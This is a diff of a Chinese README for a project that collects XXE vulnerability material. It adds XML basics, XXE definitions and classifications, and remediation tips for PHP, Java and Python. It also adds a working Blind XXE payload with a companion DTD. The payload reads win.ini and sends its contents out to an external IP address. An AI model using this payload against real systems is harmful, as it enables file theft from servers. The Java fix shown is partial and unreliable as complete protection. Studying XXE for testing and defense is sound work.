@@ -1,8 +1,8 @@
 # 《深入理解XXE漏洞》
 
-本项目用来收集整理XXE漏洞的相关内容，包括XXE的利用方法工具或思路等。XXE漏洞往往不可以执行命令，但是可以通过文件读取方法获取敏感信息，甚至进一步Getshell！作者：[ASTTeam](https://github.com/ASTTeam/XXE)
+本项目用来收集整理XXE漏洞的相关内容，包括XXE的利用方法工具或思路等。XXE漏洞往往不可以执行命令，但往往可以通过文件读取方法获取敏感信息，之后进一步Getshell！作者：[ASTTeam](https://github.com/ASTTeam/XXE)
 
-本项目创建于2022年3月3日，最近的一次更新时间为2022年3月6日。本项目会持续更新，直到海枯石烂！
+本项目创建于2022年3月3日，最近的一次更新时间为2022年3月7日。本项目会持续更新，直到海枯石烂！
 
 - [01-XXE漏洞资源]()
 - [02-XXE漏洞基础]()
@@ -66,24 +66,68 @@
 
 ## 02-XXE漏洞基础
 
-一、XXE漏洞概念
+一、XXE漏洞概念（XML External Entity Injection）
 
-二、XXE漏洞原理
+- 什么是XML？
 
-三、XXE漏洞分类
+  - XML由3个部分构成，它们分别是：文档类型定义（Document Type Definition，DTD），即XML的布局语言；可扩展的样式语言（Extensible Style Language，XSL），即XML的样式表语言；以及可扩展链接语言（Extensible Link Language，XLL）。
 
-- Blind XXE
-- OOB XXE
+- 四种实体？
+
+  - 内置实体
+    | 实体 | 实体引用 | 含义              |
+    | ---- | -------- | ----------------- |
+    | lt   | &lt;     | <（小于号）       |
+    | gt   | &gt;     | >（大于号）       |
+    | amp  | &amp;    | &（“and”符）      |
+    | apos | &apos;   | '（撇号或单引号） |
+    | quot | &quot;   | "（双引号）       |
+
+  - 字符实体
+  - 通用实体
+  - 参数实体
+
+- 什么是XXE漏洞？
+
+  - XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。.
+
+- XXE漏洞分类？
+  - OOB XXE：有回显
+  - Blind XXE：无回显
+
+三、XXE漏洞原理
 
 四、XXE漏洞危害
 
 五、XXE漏洞思考
 
+- XXE漏洞如何执行系统命令？
+- Blind XXE 如何读取敏感文件？
+
 ## 03-XXE漏洞工具
 
 - 如何开发一个XXE渗透测试和代码审计的工具？
 
-一、XXE主动扫描
+一、XXE payload
+
+- Blind XXE 读取文件
+
+```
+<?xml version="1.0" ?>
+<!DOCTYPE any[
+<!ENTITY % file SYSTEM "file://c://Windows//win.ini">
+<!ENTITY % remote SYSTEM "http://10.126.168.53/h.dtd">
+%remote;
+%send;
+]>
+<foo></foo>
+```
+
+```
+// 在服务器中创建此文件，文件名称为h.dtd。通过日志查看读取到的文件内容
+<!ENTITY % ppp "<!ENTITY &#x25; send SYSTEM 'http://10.126.168.53/?ccc=%file;'>">
+%ppp;
+```
 
 二、XXE被动扫描
 
@@ -96,6 +140,9 @@
 ## 04-XXE渗透测试
 
 一、XXE漏洞挖掘
+
+- 如何挖掘XXE漏洞？
+- XXE漏洞经常出现的位置？
 
 二、XXE漏洞实战
 
@@ -131,5 +178,17 @@
 - https://github.com/HoneTeam/XXE
 
 ## 07-XXE漏洞修复
+
+- 方案一：使用开发语言提供的禁用外部实体的方法
+  - PHP：
+    1. libxml_disable_entity_loader设置为TRUE来禁用外部实体
+  - Java：
+    1. DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
+    2. dbf.setExpandEntityReferences(false);
+  - Python：
+    1. from lxml import etree
+    2. xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
+- 方案二：过滤用户提交的XML数据
+  - 过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC。
 
 ## 08-XXE参考资源
